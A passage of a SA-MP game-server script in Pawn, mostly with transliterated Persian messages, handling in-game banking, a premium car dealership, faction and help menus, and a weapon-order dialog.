                format(bnstring,sizeof(bnstring),"{ed4025}Joker{24f90c}GaminG {ffffff}Bank{ffffff}\nMojodi: $%d.",PlayerInfo[playerid][pAccount]);
                ShowPlayerDialog(playerid,09899,DIALOG_STYLE_MSGBOX,"Bank",bnstring,"Ok","");
                return 1;
            }
            if(listitem == 3)
            {
                SendClientMessage(playerid,-1,"Command: /transfer (Player ID) (Meghdare Pool)");
                return 1;
            }
        }
    }

    if(dialogid == DIALOG_BANK_DEPOSIT)
    {
        if(response == 1)
        {
            new value =strval(inputtext);
            if(!strlen(inputtext))
            {
                SendClientMessage(playerid,-1,"Meghdare dorosti vared konid");
                ShowPlayerDialog(playerid,DIALOG_BANK_DEPOSIT,DIALOG_STYLE_INPUT,"Money","Meghdar Poole Morede Nazar Khod Ra Vared Konid.","Ok","Cancel");
            }
            if(value < 1|| value > 500000)
            {
                SendClientMessage(playerid,-1,"Meghdare  $1 Ta $500,000 Vared Konid.");
                ShowPlayerDialog(playerid,DIALOG_BANK_DEPOSIT,DIALOG_STYLE_INPUT,"Money","Meghdar Poole Morede Nazar Khod Ra Vared Konid.","Ok","Cancel");
                return 1;
            }
            if(GetPlayerPool(playerid) < value)
            {
                SendClientMessage(playerid,-1,"Onghadr Pool To Jibet Nadari.");
                ShowPlayerDialog(playerid,DIALOG_BANK_DEPOSIT,DIALOG_STYLE_INPUT,"Money","Meghdar Poole Morede Nazar Khod Ra Vared Konid.","Ok","Cancel");
                return 1;
            }
				new ccash = strval(inputtext);
             	GivePlayerPool(playerid,-ccash);
                new curfunds = PlayerInfo[playerid][pAccount];
                PlayerInfo[playerid][pAccount]=ccash+PlayerInfo[playerid][pAccount];
                SaveKonVal(playerid, "pAccount", PINFO[playerid][pAccount]);
                SendClientMessage(playerid, COLOR_WHITE, "|___ BANK STATMENT ___|");
                format(bnstring, sizeof(bnstring), "Old Balance: $%s", FormatNumber(curfunds));
                SendClientMessage(playerid, COLOR_GRAD2, bnstring);
                format(bnstring, sizeof(bnstring), "Deposit: $%s",inputtext);
                SendClientMessage(playerid, COLOR_GRAD4, bnstring);
                SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
                format(bnstring, sizeof(bnstring), "New Balance: $%s", FormatNumber(PlayerInfo[playerid][pAccount]));
                SendClientMessage(playerid, COLOR_WHITE, bnstring);

            return 1;
        }
    }
       if(dialogid == DIALOG_BANK_WITHDRAW)
    {
        if(response == 1)
        {
            new value =strval(inputtext);
            if(!strlen(inputtext))
            {
                SendClientMessage(playerid,-1,"Lotfan Poole Morede Nazare Khod Ra vared Konid..");
                ShowPlayerDialog(playerid,DIALOG_BANK_WITHDRAW,DIALOG_STYLE_INPUT,"bank","Meghdare Bardasht Az Bank Ra vared Konid","Ok","Cancel");
                return 1;
            }
            if(value < 1 || value > 1000000)
            {
                SendClientMessage(playerid,-1, "az $1 Ta $1,000,000 Vared Konid.");
                ShowPlayerDialog(playerid,DIALOG_BANK_WITHDRAW,DIALOG_STYLE_INPUT,"bank","Meghdare Bardasht Az Bank Ra vared Konid","Ok","Cancel");
                return 1;
            }
            if(PlayerInfo[playerid][pAccount] < value)
            {
                SendClientMessage(playerid,-1,"In Meghdar Pool dar Hesab Bankie Shoma Vojoud Nadarad.");
                ShowPlayerDialog(playerid,DIALOG_BANK_WITHDRAW,DIALOG_STYLE_INPUT,"bank","Meghdare Bardasht Az Bank Ra vared Konid","Ok","Cancel");
                return 1;
            }
            	new ccash = strval(inputtext);
            GivePlayerPool(playerid,ccash);
                PlayerInfo[playerid][pAccount]=PlayerInfo[playerid][pAccount]-ccash;
                SaveKonVal(playerid, "pAccount", PINFO[playerid][pAccount]);
                format(bnstring, sizeof(bnstring), "Bardasht: $%s Mojodi: $%s ", FormatNumber(ccash),FormatNumber(PlayerInfo[playerid][pAccount]));
                SendClientMessage(playerid, COLOR_YELLOW, bnstring);
            return 1;
        }
    }
	if(dialogid == 2066 && response == 1) {
	new want = IWantCar[playerid];
        if(want == 411 || want == 402 || want == 415 || want == 429 || want == 475 || want == 477 || want == 496 || want == 506 || want == 541)
        {
            if(PINFO[playerid][pPremiumAccount] <= 0)
            {
                new rouuz[256];
                new vehk = IWantCar[playerid] - 400;
                format(rouuz,256,"DealerShip: Shoma Premium account Nisti ;(",aVehicleNames[vehk]);
                SCM(playerid,COLOR_AMIR,rouuz);
                SCM(playerid,COLOR_MAMAD,"DealerShip: Baraye Kharide Premium account , CMD /Shop Ra Type konid.");
                return 1;
            }
        }
        if(want == 558 || want == 559 || want == 565 || want == 587 || want == 602 || want == 494 || want == 502 || want == 503)
        {
            if(PINFO[playerid][pPremiumAccount] <= 0)
            {
                new rouuz[256];
                new vehk = IWantCar[playerid] - 400;
                format(rouuz,256,"DealerShip: Shoma Premium account Nisti ;(",aVehicleNames[vehk]);
                SCM(playerid,COLOR_AMIR,rouuz);
                SCM(playerid,COLOR_MAMAD,"DealerShip: Baraye Kharide Premium account , CMD /Shop Ra Type konid.");
                return 1;
            }
        }
		if(want == 564 || want == 441 || want == 465 || want == 501 || want == 464)
        {
            if(PINFO[playerid][pPremiumAccount] <= 0)
            {
                new rouuz[256];
                new vehk = IWantCar[playerid] - 400;
                format(rouuz,256,"DealerShip: Shoma Premium account Nisti ;(",aVehicleNames[vehk]);
                SCM(playerid,COLOR_AMIR,rouuz);
                SCM(playerid,COLOR_MAMAD,"DealerShip: Baraye Kharide Premium account , CMD /Shop Ra Type konid.");
                return 1;
            }
        }
        new price = PriceCar[playerid];
        if(GetPlayerPool(playerid) >= price)
        {
            if((PlayerInfo[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) || (PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] != 0))
            {
		DestroyVehicle(vhid[playerid]);
		TextDrawHideForPlayer(playerid, TestModel[playerid]);
		TextDrawHideForPlayer(playerid, BuyModel[playerid]);
		TextDrawHideForPlayer(playerid, NextModel[playerid]);
		TextDrawHideForPlayer(playerid, PrevModel[playerid]);
		TextDrawHideForPlayer(playerid, ExitDS[playerid]);
		TextDrawHideForPlayer(playerid, RotModel[playerid]);
		TextDrawHideForPlayer(playerid, RotModel2[playerid]);
		PlayerTextDrawHide(playerid, CarModel[playerid]);
		PlayerTextDrawHide(playerid, PriceModel[playerid]);
		OnMashinKharidan[playerid] = 0;
		SetPlayerPos(playerid, 325.5731,-1514.8918,36.0325);
		CancelSelectTextDraw(playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
                new car = IWantCar[playerid];
                new carid;
                if(VehModKharid[playerid] == 0) carid = CreateVehicle(car, 294.4691, -1540.4004, 24.2438, 54.5325, 1, 1,-1);
                else if(VehModKharid[playerid] == 1) carid = CreateVehicle(car, 727.059692, -1529.186889, 0.101168, 180.0, 1, 1,-1);
                else if(VehModKharid[playerid] == 2) carid = CreateVehicle(car, 1520.529541, -2464.192871, 13.760436, 180.0, 1, 1,-1);
                new sendername[MAX_PLAYER_NAME];
                PlayerInfo[playerid][pCar] = carid;
                SaveKonVal(playerid, "pCar", carid);
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GivePlayerPool(playerid, -price);
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;
                if(VehModKharid[playerid] == 0)
                {
                    PlayerInfo[playerid][cLocationx] = 294.4691;
                    SaveKonFloat(playerid, "cLocationx", 294.4691);
                    PlayerInfo[playerid][cLocationy] = -1540.4004;
                    SaveKonFloat(playerid, "cLocationy", -1540.4004);
                    PlayerInfo[playerid][cLocationz] = 24.2438;
                    SaveKonFloat(playerid, "cLocationz", 24.2438);
                    PlayerInfo[playerid][cAngle] = 54.5325;
                    SaveKonFloat(playerid, "cAngle", 54.5325);
                }
                else if(VehModKharid[playerid] == 1)
                {
                    PlayerInfo[playerid][cLocationx] = 727.059692;
                    SaveKonFloat(playerid, "cLocationx", 727.059692);
                    PlayerInfo[playerid][cLocationy] = -1529.186889;
                    SaveKonFloat(playerid, "cLocationy", -1529.186889);
                    PlayerInfo[playerid][cLocationz] = 0.101168;
                    SaveKonFloat(playerid, "cLocationz", 0.101168);
                    PlayerInfo[playerid][cAngle] = 180;
                    SaveKonFloat(playerid, "cAngle", 180);
                }
                else if(VehModKharid[playerid] == 2)
                {
                    PlayerInfo[playerid][cLocationx] = 1520.529541;
                    SaveKonFloat(playerid, "cLocationx", 1520.529541);
                    PlayerInfo[playerid][cLocationy] = -2464.192871;
                    SaveKonFloat(playerid, "cLocationy", -2464.192871);
                    PlayerInfo[playerid][cLocationz] = 13.760436;
                    SaveKonFloat(playerid, "cLocationz", 13.760436);
                    PlayerInfo[playerid][cAngle] = 180;
                    SaveKonFloat(playerid, "cAngle", 180);
                }
                PlayerInfo[playerid][cColor1] = 1;
                SaveKonVal(playerid, "cColor1", 1);
                PlayerInfo[playerid][cColor2] = 1;
                SaveKonVal(playerid, "cColor2", 1);
                PlayerInfo[playerid][cModel] = car;
                SaveKonVal(playerid, "cModel", car);
                PlayerInfo[playerid][cPrice] = PriceCar[playerid];
                SaveKonVal(playerid, "cPrice", PriceCar[playerid]);
                new string[256];
                format(string, sizeof(string), "NewVeh");
                strmid(PlayerInfo[playerid][cPlate], string, 0, strlen(string), 255);
                SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
                SetVehicleNumberPlate(carid,"NewVeh");
                PlayerInfo[playerid][cLock] = 1;
                SaveKonVal(playerid, "cLock", 1);
                PlayerInfo[playerid][cDestroyed] = 0;
                SaveKonVal(playerid, "cDestroyed", 0);
                PlayerInfo[playerid][cFixed] = 1;
                SaveKonVal(playerid, "cFixed", 1);
                PlayerInfo[playerid][cInsurance] = DefaultInsurance;
                SaveKonVal(playerid, "cInsurance", DefaultInsurance);
                PlayerInfo[playerid][cFuel] = 100;
                SaveKonVal(playerid, "cFuel", 100);
                PlayerInfo[playerid][cHealth] = 1000.0;
                SaveKonFloat(playerid, "cHealth", 1000);
                PINFO[playerid][gLocationX] = 0;
                SaveKonFloat(playerid, "gLocationX", 0);
                PINFO[playerid][gLocationY] = 0;
                SaveKonFloat(playerid, "gLocationY", 0);
                PINFO[playerid][gLocationZ] = 0;
                SaveKonFloat(playerid, "gLocationZ", 0);
                PINFO[playerid][gAngle] = 0;
                SaveKonFloat(playerid, "gAngle", 0);
                PINFO[playerid][gParked] = 0;
                SaveKonVal(playerid, "gParked", 0);
                PlayerInfo[playerid][cMod1] = 0;
                SaveKonVal(playerid, "cMod1", 0);
                PlayerInfo[playerid][cMod3] = 0;
                SaveKonVal(playerid, "cMod3", 0);
                PlayerInfo[playerid][cMod4] = 0;
                SaveKonVal(playerid, "cMod4", 0);
                PlayerInfo[playerid][cMod5] = 0;
                SaveKonVal(playerid, "cMod5", 0);
                PlayerInfo[playerid][cMod6] = 0;
                SaveKonVal(playerid, "cMod6", 0);
                PlayerInfo[playerid][cMod7] = 0;
                SaveKonVal(playerid, "cMod7", 0);
                PlayerInfo[playerid][cMod8] = 0;
                SaveKonVal(playerid, "cMod8", 0);
                PlayerInfo[playerid][cMod9] = 0;
                SaveKonVal(playerid, "cMod9", 0);
                PlayerInfo[playerid][cMod10] = 0;
                SaveKonVal(playerid, "cMod10", 0);
                PlayerInfo[playerid][cMod11] = 0;
                SaveKonVal(playerid, "cMod11", 0);
                PlayerInfo[playerid][cMod12] = 0;
                SaveKonVal(playerid, "cMod12", 0);
                PlayerInfo[playerid][cMod13] = 0;
                SaveKonVal(playerid, "cMod13", 0);
                PlayerInfo[playerid][cMod14] = 0;
                SaveKonVal(playerid, "cMod14", 0);
                PlayerInfo[playerid][cMod15] = 0;
                SaveKonVal(playerid, "cMod15", 0);
                PlayerInfo[playerid][cMod16] = 0;
                SaveKonVal(playerid, "cMod16", 0);
                PlayerInfo[playerid][cMod17] = 0;
                SaveKonVal(playerid, "cMod17", 0);
                PlayerInfo[playerid][cPaintJob] = 3;
                SaveKonVal(playerid, "cPaintJob", 3);
                PlayerInfo[playerid][cKilo] = 0.0;
                SaveKonFloat(playerid, "cKilo", 0);
                PINFO[playerid][cPanel] = 0;
                SaveKonVal(playerid, "cPanel", 0);
                PINFO[playerid][cDoors] = 0;
                SaveKonVal(playerid, "cDoors", 0);
                PINFO[playerid][cLights] = 0;
                SaveKonVal(playerid, "cLights", 0);
                PINFO[playerid][cTires] = 0;
                SaveKonVal(playerid, "cTires", 0);
                SetVehicleParamsEx(PlayerInfo[playerid][pCar], 0, 0, 0, 1, 0, 0, 0);
                PlayerPlayMusic(playerid);
                new mod = IWantCar[playerid] - 400;
                new ali2[256];
                format(ali2,256,"Tabrik ! Shoma %s Ra Kharidid.",aVehicleNames[mod]);
                SCM(playerid,COLOR_ALI,ali2);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Type: /carhelp Baraye Didane CMD Haye Car.");
                SCM(playerid,COLOR_ALI,"Be Noghte Ghermez Rang Toye Naghshe Beravid.");



                new Float:x,Float:y,Float:z;
                GetVehiclePos(carid, x, y, z);
                if(OnCheckpoint[playerid] == 0)
                {
                    OnCheckpoint[playerid] = 1;
                    SetPlayerCheckpoint(playerid, x, y, z, 6);
                    locatemashin[playerid] = 2;
                }
                else
                {
                    SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
                }
                PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                gEngine[playerid] = 0;
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;
                EngineSTATE[carid] = 0;
                Benzin[carid] = 100;
                SetVehicleHealthEx(carid, 1000.0);
                IWantCar[playerid] = 0;
                PriceCar[playerid] = 0;
                for(new i = 0; i < LastPID; i++ )
                {
                    if(IsPlayerConnected(i))
                    {
                        SetVehicleParamsForPlayer(PlayerInfo[playerid][pCar],i,0,1);
                    }
                }
                //SaveAccount(playerid);
                return 1;
            }
            else if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] == 0)
            {
                if(PINFO[playerid][pPremiumAccount] == 0) return SCM(playerid,COLOR_ALI,"Baraye Kharide 2 Mashin shoma Niaz be  premium account Darid.");
		DestroyVehicle(vhid[playerid]);
		TextDrawHideForPlayer(playerid, TestModel[playerid]);
		TextDrawHideForPlayer(playerid, BuyModel[playerid]);
		TextDrawHideForPlayer(playerid, NextModel[playerid]);
		TextDrawHideForPlayer(playerid, PrevModel[playerid]);
		TextDrawHideForPlayer(playerid, ExitDS[playerid]);
		TextDrawHideForPlayer(playerid, RotModel[playerid]);
		TextDrawHideForPlayer(playerid, RotModel2[playerid]);
		PlayerTextDrawHide(playerid, CarModel[playerid]);
		PlayerTextDrawHide(playerid, PriceModel[playerid]);
		OnMashinKharidan[playerid] = 0;
		SetPlayerPos(playerid, 325.5731,-1514.8918,36.0325);
		CancelSelectTextDraw(playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);

                new car = IWantCar[playerid];
                new carid = CreateVehicle(car, 294.4691, -1540.4004, 24.2438, 54.5325, 1, 1,-1);
                new sendername[MAX_PLAYER_NAME];
                PlayerInfo[playerid][pCar_2] = carid;
                SaveKonVal(playerid, "pCar_2", carid);
                GetPlayerName(playerid, sendername, sizeof(sendername));
                GivePlayerPool(playerid, -price);
                OwnedMashin_2[carid] = 1;
                MashinOwner_2[carid] = playerid;
                PlayerInfo[playerid][cLocationx_2] = 294.4691;
                SaveKonFloat(playerid, "cLocationx_2", 294.4691);
                PlayerInfo[playerid][cLocationy_2] = -1540.4004;
                SaveKonFloat(playerid, "cLocationy_2", -1540.4004);
                PlayerInfo[playerid][cLocationz_2] = 24.2438;
                SaveKonFloat(playerid, "cLocationz_2", 24.2438);
                PlayerInfo[playerid][cAngle_2] = 54.5325;
                SaveKonFloat(playerid, "cAngle_2", 54.5325);
                PlayerInfo[playerid][cColor1_2] = 1;
                SaveKonVal(playerid, "cColor1_2", 1);
                PlayerInfo[playerid][cColor2_2] = 1;
                SaveKonVal(playerid, "cColor2_2", 1);
                PlayerInfo[playerid][cModel_2] = car;
                SaveKonVal(playerid, "cModel_2", car);
                PlayerInfo[playerid][cPrice_2] = PriceCar[playerid];
                SaveKonVal(playerid, "cPrice_2", PriceCar[playerid]);
                new string[256];
                format(string, sizeof(string), "NewVeh");
                strmid(PlayerInfo[playerid][cPlate_2], string, 0, strlen(string), 255);
                SaveKonStr(playerid, "cPlate_2", PINFO[playerid][cPlate_2]);
                SetVehicleNumberPlate(carid,"NewVeh");
                PlayerInfo[playerid][cLock_2] = 1;
                SaveKonVal(playerid, "cLock_2", 1);
                PlayerInfo[playerid][cDestroyed_2] = 0;
                SaveKonVal(playerid, "cDestroyed_2", 0);
                PlayerInfo[playerid][cFixed_2] = 1;
                SaveKonVal(playerid, "cFixed_2", 1);
                PlayerInfo[playerid][cInsurance_2] = DefaultInsurance;
                SaveKonVal(playerid, "cInsurance_2", DefaultInsurance);
                PlayerInfo[playerid][cFuel_2] = 100;
                SaveKonVal(playerid, "cFuel_2", 100);
                PlayerInfo[playerid][cHealth_2] = 1000.0;
                SaveKonFloat(playerid, "cHealth_2", 1000);
                PlayerInfo[playerid][cMod1_2] = 0;
                SaveKonVal(playerid, "cMod1_2", 0);
                PlayerInfo[playerid][cMod3_2] = 0;
                SaveKonVal(playerid, "cMod3_2", 0);
                PINFO[playerid][gLocationX_2] = 0;
                SaveKonFloat(playerid, "gLocationX_2", 0);
                PINFO[playerid][gLocationY_2] = 0;
                SaveKonFloat(playerid, "gLocationY_2", 0);
                PINFO[playerid][gLocationZ_2] = 0;
                SaveKonFloat(playerid, "gLocationZ_2", 0);
                PINFO[playerid][gAngle_2] = 0;
                SaveKonFloat(playerid, "gAngle_2", 0);
                PINFO[playerid][gParked_2] = 0;
                SaveKonVal(playerid, "gParked_2", 0);
                PlayerInfo[playerid][cMod4_2] = 0;
                SaveKonVal(playerid, "cMod4_2", 0);
                PlayerInfo[playerid][cMod5_2] = 0;
                SaveKonVal(playerid, "cMod5_2", 0);
                PlayerInfo[playerid][cMod6_2] = 0;
                SaveKonVal(playerid, "cMod6_2", 0);
                PlayerInfo[playerid][cMod7_2] = 0;
                SaveKonVal(playerid, "cMod7_2", 0);
                PlayerInfo[playerid][cMod8_2] = 0;
                SaveKonVal(playerid, "cMod8_2", 0);
                PlayerInfo[playerid][cMod9_2] = 0;
                SaveKonVal(playerid, "cMod9_2", 0);
                PlayerInfo[playerid][cMod10_2] = 0;
                SaveKonVal(playerid, "cMod10_2", 0);
                PlayerInfo[playerid][cMod11_2] = 0;
                SaveKonVal(playerid, "cMod11_2", 0);
                PlayerInfo[playerid][cMod12_2] = 0;
                SaveKonVal(playerid, "cMod12_2", 0);
                PlayerInfo[playerid][cMod13_2] = 0;
                SaveKonVal(playerid, "cMod13_2", 0);
                PlayerInfo[playerid][cMod14_2] = 0;
                SaveKonVal(playerid, "cMod14_2", 0);
                PlayerInfo[playerid][cMod15_2] = 0;
                SaveKonVal(playerid, "cMod15_2", 0);
                PlayerInfo[playerid][cMod16_2] = 0;
                SaveKonVal(playerid, "cMod16_2", 0);
                PlayerInfo[playerid][cMod17_2] = 0;
                SaveKonVal(playerid, "cMod17_2", 0);
                PlayerInfo[playerid][cPaintJob_2] = 3;
                SaveKonVal(playerid, "cPaintJob_2", 3);
                PlayerInfo[playerid][cKilo_2] = 0.0;
                SaveKonFloat(playerid, "cKilo_2", 0);
                PINFO[playerid][cPanel_2] = 0;
                SaveKonVal(playerid, "cPanel_2", 0);
                PINFO[playerid][cDoors_2] = 0;
                SaveKonVal(playerid, "cDoors_2", 0);
                PINFO[playerid][cLights_2] = 0;
                SaveKonVal(playerid, "cLights_2", 0);
                PINFO[playerid][cTires_2] = 0;
                SaveKonVal(playerid, "cTires_2", 0);
                SetVehicleParamsEx(PlayerInfo[playerid][pCar_2], 0, 0, 0, 1, 0, 0, 0);
                PlayerPlayMusic(playerid);
                new mod = IWantCar[playerid] - 400;
                new ali2[256];
                format(ali2,256,"Tabrik ! Shoma %s Ra Kharidid.",aVehicleNames[mod]);
                SCM(playerid,COLOR_ALI,ali2);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "Type: /carhelp Baraye Didane CMD Haye Car.");
                SCM(playerid,COLOR_ALI,"Be Noghte Ghermez Rang Toye Naghshe Beravid.");



                new Float:x,Float:y,Float:z;
                GetVehiclePos(carid, x, y, z);
                if(OnCheckpoint[playerid] == 0)
                {
                    OnCheckpoint[playerid] = 1;
                    SetPlayerCheckpoint(playerid, x, y, z, 6);
                    locatemashin[playerid] = 2;
                }
                else
                {
                    SCM(playerid,COLOR_Good,"You already have an enable checkpoint.");
                }
                PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                gEngine[playerid] = 0;
                EngineSTATE[carid] = 0;
                Benzin[carid] = 100;
                SetVehicleHealthEx(carid, 1000.0);
                IWantCar[playerid] = 0;
                PriceCar[playerid] = 0;
                for(new i = 0; i < LastPID; i++ )
                {
                    if(IsPlayerConnected(i))
                    {
                        SetVehicleParamsForPlayer(PlayerInfo[playerid][pCar_2],i,0,1);
                    }
                }
                //SaveAccount(playerid);
                return 1;
            }
            else return SCM(playerid,COLOR_ALI,"Shoma 2 Mashin Darid.");
        }
        else
        {
            SendClientMessage(playerid, COLOR_ALI, "Shoma Pool Kafi Baraye Kharid In Mashin Ro Nadarid ;(");
            PlayerPlaySound(playerid, 1053, 0.0, 0.0, 10.0);
            return 1;
        }
    }
if(dialogid == DIALOG_FFNN)
	{
		if(response)
		{
		ShowPlayerDialog(playerid,DIALOG_FFNN,DIALOG_STYLE_LIST,"{57e547}Factions","{FFFFFF}Peaceful Factions\nMedium Factions\nExpert Factions\n Civilian ====> [0]","Entekhab","Enseraf");
        new strlol[2400];
        if(listitem == 0) {strcat(strlol, "{00FF40}4 {FF8040}= {57e547}Fire & Medic Department{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}9 {FF8040}= {825B8C}News Reporter{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}10 {FF8040}= {FFFF00}Taxi Driver{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}11 {FF8040}= {0974C6}School Instructor{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}16 {FF8040}= {F9F7CE}Tow Car Company{FFFFFF}\n\n", 2400);
        return ShowPlayerDialog(playerid, 8423, DIALOG_STYLE_MSGBOX, "Peaceful Factions", strlol, "Close", "");
        }
        if(listitem == 1) {strcat(strlol, "{00FF40}5 {FF8040}= {5D7E8D}Silence Mafia{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}6 {FF8040}= {3E3535}The Killers Family{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}12 {FF8040}= {19AF23}Dangerous Tigers Family{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}13 {FF8040}= {FFBA00}Legendary Men Family{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}14 {FF8040}= {B32CF6}Fast N Furious Family{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}15 {FF8040}= {00ECEC}Storm Men Family{FFFFFF}\n\n", 2400);
        return ShowPlayerDialog(playerid, 8423, DIALOG_STYLE_MSGBOX, "Medium Factions", strlol, "Close", "");
		}
        if(listitem == 2) {strcat(strlol, "{00FF40}1 {FF8040}= {171DFF}Police Department{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}2 {FF8040}= {171DFF}FBI{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}3 {FF8040}= {171DFF}National Guard{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}7 {FF8040}= {BBF060}Mayor{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}8 {FF8040}= {8E2323}Hitman Agency{FFFFFF}\n\n", 2400);
        strcat(strlol, "{00FF40}17 {FF8040}= {57e547}Staff{FFFFFF}\n\n", 2400);
        return ShowPlayerDialog(playerid, 8423, DIALOG_STYLE_MSGBOX, "Expert Factions", strlol, "Close", "");
           }
		}
	}
	if(dialogid == 8590)
        {
            if(response)
            {
            if(listitem == 0) {
			ShowPlayerDialog(playerid, 9091, DIALOG_STYLE_MSGBOX,"Help","Hi man This is {57e547}JoKeR GaminG {FFFFFF} help {57e547}System","Ok","");
			return 1;
			}
            if(listitem == 1) {
			ShowPlayerDialog(playerid, 8456, DIALOG_STYLE_MSGBOX,"General","/Stats : baraye didan etela'ate shakhsi khod \n\n /GPS : baraye didan location haye mohem server.","Ok","");
			return 1;
			}
			if(listitem == 2) {
			if(PINFO[playerid][pHelper] < 1) return SCM(playerid, COLOR_YELLOW2, "Error: you are not helper to read this part.")
			ShowPlayerDialog(playerid, 4150, DIALOG_STYLE_LIST, "Helpers", "{FFFFFF}{57e547}/Ch :{FFFFFF} for close helpme conversation \n\n{57e547}/Ah : {FFFFFF} for Open a conversation. \n\n{57e547}/Helpmes : {FFFFFF}baraye didan helpme haye mojod. \n\n{57e547}/hl :{FFFFFF}baraye chat dar helpers chat.", "Ok", "");
			return 1;
			}
			if(listitem == 3) {
			ShowPlayerDialog(playerid, 6590, DIALOG_STYLE_LIST, "Civillians Helpery", "/jobs : baraye pool dar avardan \n\n /helpme : baraye porsidan soal haye khod \n\n /Report : gozaresh cheat & hack &... be admin ha\n\n /Admins: baraye didan admin haye online", "Select", "Close");
			return 1;
			}
			if(listitem == 4) {
			ShowPlayerDialog(playerid, 5023, DIALOG_STYLE_LIST, "Bank Helpery", "{FFFFFF}Use /Deposit For Deposit money \n{FFFFFF}/Transfer baraye enteghale pool\n{FFFFFF}/Withdraw : bardashte pool.\n", "Select", "Close");
			return 1;
			}
			if(listitem == 5) {
			ShowPlayerDialog(playerid, 1554, DIALOG_STYLE_MSGBOX,"House & Rent","/buyhouse : to buy house . \n/Rentroom : baraye ejare khane\n /Sellhouse : taiin gheymat khane shoma\n/setrentable [on/off]: baraye taghie ghabel ejare budan\n/RentPrice : gheymat ejare house ha !","Close","");
			return 1;
			}
			if(listitem == 6) {
			ShowPlayerDialog(playerid, 5660, DIALOG_STYLE_MSGBOX,"Referral","/myreferral : in dastoor baraye didan code moarefi ast\nshoma ba avardane har nafar bayad be on begooid moghe sabte'nam hatman code moaref [referral]shoma ra bezanand!\nvaghti Dooste shoma code moaref shoma ra dar server vared mikonad server har buy level ke shakhse moghabel konad\nbaraye shoma Gift va jayezei az jomle Respect va pool\n dar nazar migirad ba tashakor\n Modiriat ,Server {57e547}JoKeR GaminG {FFFFFF}Team","Yes","Close");
			return 1;
			}
			if(listitem == 7) {
			if(PINFO[playerid][pAdmin] < 1) return SCM(playerid, COLOR_YELLOW2, "Error: you are not admin to Read this part.")
			ShowPlayerDialog(playerid, 9870, DIALOG_STYLE_INPUT,"administrative hepl","/Adh : it's a fully help of your Admins and another one you just can see your own admin level help on /Adh.\n{57e547}/Reports : report haye mojod ra be shoma neshan midahad.\n/cr : report shakhse moghabel ra az tarighe id oo mibandad . \n/ar :dar haghghat report zoori basz.\n","Accept","Close");
			return 1;
			}
			if(listitem == 8) {
			ShowPlayerDialog(playerid, 5481, DIALOG_STYLE_MSGBOX,"Tarikhche server","\n in joze baxe {57e547}JoKeR GaminG {FFFFFF} hast va {57e547}JoKeR GaminG {FFFFFF} Rate shode ast fe'lan az in bax hastim ba tashakor\n {57e547}JoKeR GaminG {FFFFFF}.","Yes","Close");
			return 1;
			}
			if(listitem == 9) {
			ShowPlayerDialog(playerid, 5487, DIALOG_STYLE_MSGBOX,"Masooliat","Khob dooste aziz be in ghesmat khob deghat kon va gosh kon\n ma HichGoone {57e547} hich Goone{FFFFFF} masooliati dar ghebale Account haye hack shode\n dozdide shode\n pass haye gom shode va ... nadarim va hame in ha bar asas Taiid aval bazi bar ohde player aziz mibashad.\n\n\n\n{57e547}{57e547}JoKeR GaminG {FFFFFF}","Yes","Close");
			return 1;
			}
			if(listitem == 10) {
			ShowPlayerDialog(playerid, 94752, DIALOG_STYLE_MSGBOX,"{FFFFFF}Cheats {57e547}& {FFFFFF}Hack","{FFFFFF}Har goone cheat Dar Server {57e547} {57e547}JoKeR GaminG {FFFFFF}{FFFFFF} mojebe ban 5 rooze\n baraye player mishavad va agar ham ta be hal ekhtar nadashte bashad mojebe\n  Dariafte ekhtar migardad\nCheat Isn't possible here my Bro :)\n{57e547}#CheaTinG From_founder","Yes","Close");
			}
		}
			return 1;
			}
	if(dialogid == DIALOG_ORDER)
	{
		if(response)
		{
			PlayerPlaySound(playerid,1052,0.0,0.0,0.0);
			ShowPlayerDialog(playerid,DIALOG_ORDER,DIALOG_STYLE_LIST,"{57e547}Order Guns","{57e547}> Full Health And Armour\n{FFFFFF}Desert Eagle {57e547}(+2)\n{FFFFFF}AK-47 {57e547}(+2)\n{FFFFFF}M4 {57e547}(+2)\n{FFFFFF}Shotgun {57e547}(+2)\n{FFFFFF}Combat Shotgun {57e547}(+3)\n{FFFFFF}Tec-9 {57e547}(+4)\n{FFFFFF}Micro Uzi {57e547}(+4)\n{FFFFFF}Rifle {57e547}(+5)","Entekhab","Enseraf");
	    	if(IsPlayerInHQ(playerid))
		    {
				if(listitem == 0) { SetPlayerZereh(playerid, 100); SetPlayerKhoon(true, playerid, 100); return 1; }
				if(listitem == 1) return GivePlayerTofang(playerid, 24,9999999);
				if(listitem == 2) { if(PINFO[playerid][pRank] <= 1) return SCM(playerid,COLOR_ALI,"You haven't rank +2"); else GivePlayerTofang(playerid, 30,9999999); return 1; }
				if(listitem == 3) { if(PINFO[playerid][pRank] <= 1) return SCM(playerid,COLOR_ALI,"You haven't rank +2"); else GivePlayerTofang(playerid, 31,9999999); return 1; }
